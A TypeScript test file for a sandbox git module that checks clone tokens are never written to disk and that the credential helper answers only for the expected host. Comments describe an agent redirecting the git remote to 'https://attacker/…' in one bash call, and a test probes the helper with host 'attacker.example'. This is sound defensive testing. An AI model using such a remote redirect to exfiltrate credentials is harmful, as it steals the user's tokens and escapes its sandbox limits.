import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { getHostProvider } from "../host-provider.ts";
import { CREDENTIAL_HELPER, gitCredentialArgs, gitEnv } from "../git.ts";

/**
 * The invariant sandbox/git.ts exists for: after a clone with credentials, the
 * token is nowhere on disk in the sandbox. Driven through the host provider
 * against a local bare repository — no network, no Docker — because the
 * property is about what git writes, which is the same under either provider.
 *
 * `file://` never consults a credential helper, so the token is not *used*
 * here; what is asserted is that it is not *written*. That is the half that
 * used to be wrong: the old code embedded it in the clone URL, which git
 * stores in `.git/config`, inside an environment the model can `cat`.
 */
let root: string;
let origin: string;
const TOKEN = "ghp_verysecrettoken1234";

beforeEach(() => {
  root = mkdtempSync(path.join(os.tmpdir(), "loxaic-git-"));
  process.env.SANDBOX_HOST_ROOT = path.join(root, "sandboxes");
  // A bare origin with one commit on `main` and a second branch.
  const work = path.join(root, "work");
  execFileSync("git", ["init", "-q", "-b", "main", work]);
  writeFileSync(path.join(work, "README.md"), "hello\n");
  const env = {
    ...process.env,
    GIT_AUTHOR_NAME: "t",
    GIT_AUTHOR_EMAIL: "t@e",
    GIT_COMMITTER_NAME: "t",
    GIT_COMMITTER_EMAIL: "t@e",
  };
  execFileSync("git", ["-C", work, "add", "."], { env });
  execFileSync("git", ["-C", work, "commit", "-q", "-m", "init"], { env });
  execFileSync("git", ["-C", work, "branch", "dev"], { env });
  origin = path.join(root, "origin.git");
  execFileSync("git", ["clone", "-q", "--bare", work, origin]);
});

afterEach(() => {
  Reflect.deleteProperty(process.env, "SANDBOX_HOST_ROOT");
  rmSync(root, { recursive: true, force: true });
});

describe("cloning with credentials", () => {
  it("leaves no trace of the token in the checkout", async () => {
    const handle = await getHostProvider().create("u", {
      repoUrl: `file://${origin}`,
      branch: "main",
      newBranch: "loxaic/abc",
      git: { token: TOKEN, identity: { name: "Octo Cat", email: "octo@example.test" } },
    });

    const config = readFileSync(path.join(handle.workdir, ".git", "config"), "utf8");
    expect(config).not.toContain(TOKEN);
    const remote = await handle.exec(["git", "config", "--get", "remote.origin.url"], { workdir: handle.workdir });
    expect(remote.stdout).not.toContain(TOKEN);
    // Nothing else either: the helper text goes in argv for one command and is
    // never persisted, so the whole .git directory should be token-free.
    const grep = await handle.exec(["grep", "-r", TOKEN, ".git"], { workdir: handle.workdir });
    expect(grep.exitCode).not.toBe(0);
    await handle.destroy();
  });

  it("checks out the working branch from the base and sets the identity", async () => {
    const handle = await getHostProvider().create("u", {
      repoUrl: `file://${origin}`,
      branch: "dev",
      newBranch: "loxaic/abc",
      git: { identity: { name: "Octo Cat", email: "octo@example.test" } },
    });
    const branch = await handle.exec(["git", "rev-parse", "--abbrev-ref", "HEAD"], { workdir: handle.workdir });
    expect(branch.stdout.trim()).toBe("loxaic/abc");
    // Cut from `dev`: the two point at the same commit.
    const dev = await handle.exec(["git", "rev-parse", "dev"], { workdir: handle.workdir });
    const head = await handle.exec(["git", "rev-parse", "HEAD"], { workdir: handle.workdir });
    expect(head.stdout.trim()).toBe(dev.stdout.trim());
    const name = await handle.exec(["git", "config", "user.name"], { workdir: handle.workdir });
    expect(name.stdout.trim()).toBe("Octo Cat");
    // Repo-local: the setting lives in this checkout's config, not the host's.
    const local = readFileSync(path.join(handle.workdir, ".git", "config"), "utf8");
    expect(local).toContain("Octo Cat");
    await handle.destroy();
  });

  it("is a full clone, so history is available to the agent", async () => {
    const handle = await getHostProvider().create("u", { repoUrl: `file://${origin}`, branch: "main" });
    const shallow = await handle.exec(["git", "rev-parse", "--is-shallow-repository"], { workdir: handle.workdir });
    expect(shallow.stdout.trim()).toBe("false");
    await handle.destroy();
  });

  it("fails the create, redacted, rather than returning an empty checkout", async () => {
    const attempt = () =>
      getHostProvider().create("u", { repoUrl: `file://${root}/does-not-exist.git`, git: { token: TOKEN } });
    await expect(attempt()).rejects.toThrow(/git clone failed/);
    let message = "";
    try {
      await attempt();
    } catch (err) {
      message = (err as Error).message;
    }
    expect(message).not.toContain(TOKEN);
  });
});

describe("the credential helper", () => {
  const helperFn = CREDENTIAL_HELPER.slice(1); // drop git's leading "!"

  /** Runs the helper the way git does: `host=` and friends on stdin. */
  function ask(stdin: string, env: Record<string, string>): string {
    return execFileSync("bash", ["-c", `${helperFn} get`], { input: stdin, env: { ...process.env, ...env } }).toString();
  }

  it("resets the helper list first, so a `store` helper in the account's gitconfig never sees the token", () => {
    // `-c credential.helper=…` appends. Without the reset, git's post-auth
    // `approve` hands the token to every helper in the chain — including a
    // `credential.helper = store` in the server account's own ~/.gitconfig,
    // which writes it to ~/.git-credentials in plaintext. file:// clones never
    // consult a helper, which is why the clone test above cannot see this.
    const args = gitCredentialArgs();
    const reset = args.indexOf("credential.helper=");
    const helper = args.findIndex((a) => a.startsWith("credential.helper=!"));
    expect(reset).toBeGreaterThanOrEqual(0);
    expect(helper).toBeGreaterThan(reset);
    // Nothing from the checkout runs beside, or between git and, the token.
    expect(args).toContain("core.hooksPath=/dev/null");
    expect(args).toContain("core.fsmonitor=false");
    expect(args).toContain("http.proxy=");
    expect(args).toContain("http.sslVerify=true");
  });

  it("answers only for the host the token was issued for", () => {
    const env = gitEnv(TOKEN, "https://github.com/octo/real.git");
    expect(env.LOXAIC_GIT_HOST).toBe("github.com");
    expect(ask("protocol=https\nhost=github.com\n\n", env)).toContain(`password=${TOKEN}`);
    // `git remote set-url origin https://attacker/…` is one bash tool call;
    // a helper that ignored its stdin would POST the token there.
    expect(ask("protocol=https\nhost=attacker.example\n\n", env)).toBe("");
  });

  it("answers for any host when no expected host is set, which only a tokenless env does", () => {
    const env = gitEnv(TOKEN);
    expect(env.LOXAIC_GIT_HOST).toBeUndefined();
    expect(ask("host=anything\n\n", env)).toContain(`password=${TOKEN}`);
  });
});
